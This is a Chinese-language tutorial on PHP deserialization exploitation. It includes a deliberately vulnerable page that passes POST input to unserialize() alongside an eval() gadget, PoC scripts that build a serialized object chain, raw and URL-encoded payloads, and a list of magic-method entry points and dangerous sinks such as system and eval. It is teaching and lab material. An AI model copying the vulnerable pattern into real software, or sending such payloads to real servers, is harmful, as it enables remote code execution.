[TOC]



# ==PHP反序列化基础利用连==

**POC中如果不是为了给属性赋值，都可以不要**

面向属性编程

## 一、构造含有反序列化漏洞的代码

### usevul.php

```php
<?php

class Test{
    function hello() {
        echo "ymqyyds";
    }
}

class vul {
    var $data;

    function hello() {
        @eval($this->data);
    }
}

class Woniu{
    var $a;

    function __construct() {
        $this->a = new Test();
    }

    function __destruct() {
        $this->a->hello();
    }
}

unserialize($_POST['code']);

?>
```

## 二、漏洞的调用链

```
找到 __destruct() 敏感函数，观察哪个 __destruct() 中有可执行恶意代码，第一时间看到 Woniu中的
function __destruct() {
	$this->a->hello();
}
然后溯源$this->a，发现a在 __construct() 中被实例化为Test类的实例
那么$this->a->hello();调用的就是Test类中的hello方法，也就是
function hello() {
	echo "ymqyyds";
}
但我们需要让反序列化时应该执行vul类中的方法
function hello() {
	@eval($this->data);
}
所以在构造POC时就需要将Woniu类中的a实例化为vul的对象并且$data赋值为phpinfo(),然后序列化
```

### POC生成

unserializePOC.php

```php
<?php
class vul {
    var $data="phpinfo();";

    function hello() {
        @eval($this->data);
    }
}

class Woniu{
    var $a;

    function __construct() {
        $this->a = new vul();
    }

    function __destruct() {
        $this->a->hello();
    }
}

$woniu = new Woniu();
echo serialize($woniu);
?>
```

访问POC页面获取POC序列化值

![image-20240826113517768](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240826113517768.png)

访问有漏洞的页面，并传入参数

![image-20240826113634273](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240826113634273.png)

## 三、类属性含有访问修饰符时漏洞利用

### usevul.php

```php
<?php

class Test{
    function hello() {
        echo "ymqyyds";
    }
}

class vul {
    protected $data;

    function hello() {
        @eval($this->data);
    }
}

class Woniu{
    private $a;

    function __construct() {
        $this->a = new Test();
    }

    function __destruct() {
        $this->a->hello();
    }
}

unserialize($_POST['code']);

?>
```

### POC生成

```php
<?php
class vul {
    protected $data="phpinfo();";

    function hello() {
        //@eval($this->data);
    }
}

class Woniu{
    private $a;

    function __construct() {
        $this->a = new vul();
    }

    function __destruct() {
        $this->a->hello();
    }
}

$woniu = new Woniu();
echo serialize($woniu);
?>
```

访问POC生成页面，获取序列化后的POC值

```
O:5:"Woniu":1:{s:8:"Woniua";O:3:"vul":1:{s:7:"*data";s:10:"phpinfo();";}} 
```

![image-20240826114447050](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240826114447050.png)

一眼看过去我们就会发现，为什么 Woniu 的长度是 8 ，data 变成了 *data 而且它的长度变成了 7 ，我们查看一下源代码

![image-20240826114713261](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240826114713261.png)

可以发现存在不可见字符，实际上这不可见字符就是 %00 ，所以复制粘贴时也会出现截断的情况

此时再把这段序列值作为参数值传给有漏洞的页面就无法利用了，因为序列值中的字符串长度值（例如这里的 8 或 7 ）与字符串值真实的长度（这里指Woniu真是长度为6和*data长度不为7）不匹配

![image-20240826115045483](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240826115045483.png)

遇到这种情况就需要采取编码格式

### URL编码POC

```php
echo urlencode(serialize($woniu));
```

只需要将输出的序列值及进行URL编码即可

```
O%3A5%3A%22Woniu%22%3A1%3A%7Bs%3A8%3A%22%00Woniu%00a%22%3BO%3A3%3A%22vul%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
```

此时不管是截断符还是字符串本身都会融入编码中

![image-20240826115502733](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240826115502733.png)

### URL编码后的POC传入漏洞页面参数

![image-20240826115737378](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240826115737378.png)

## 四、反序列化的常用手段

### 1、反序列化的常见起点

```php
__destruct();	//该函数一定会调用，考虑优先级最高

__wakeup();		//该函数一定会被调用，但是有可能会在该函数中对一些在__destruct()中调用的方法或值做修改，导致最后的__destruct()无法调用

__toString();	//当一个对象被反序列化后又被当做字符串使用就会被调用
```

### 2、反序列化的常见中间跳板

```php
__toString();	//当一个对象被当作字符串使用时就会被调用

__get();		//读取不可访问或不存在的属性时被调用

__set();		//当对不可访问或不存在的属性赋值时被调用

__isset();		//当对不可访问或不存在的属性调用isset()或empty()时被调用，形如 $this->$func();

__call($name,$args);		//当调用不可访问或不存在的方法时被调用
```

### 3、反序列化的常见终点

```php
call_user_func(funcname,arg_01,arg_02...);		//调用普通函数，一般php代码执行都会选择这里

call_user_func_array(array(classname，funcname),arg_01,arg_02...);	//调用类方法，一般php代码都会选择这里

执行指令，文件操作，执行代码等敏感操作（例如eval,system,shell_exec,....）
```

### 4、常用的函数调用方式

```php
<?php
function add($a,$b) {
    echo $a + $b ;
    echo "</br>";
}

class Demo{
    function add($a,$b) {
        echo $a + $b ;
        echo "</br>";
    }

    function __call($name,$args) {
        echo $name."函数调用失败"."</br>";
    }
}


call_user_func("add",100,200);  //300  使用call_user_func()调用自定义函数
call_user_func_array("add",array(1000,2000));   //3000 使用call_user_func_array()调用自定义函数


call_user_func(array("Demo","add"),100,200);  //300  使用call_user_func()调用自定义类方法
call_user_func_array(array("demo","add"),array(1000,2000));    //3000  使用call_user_func_array()调用自定义类方法
?>
```

> 如果 call_user_func() 和 call_user_func_array() 的参数可控时，我们可以调用system函数并传参，或者调用assert函数并传参等，实现各种敏感函数的调用来进行利用

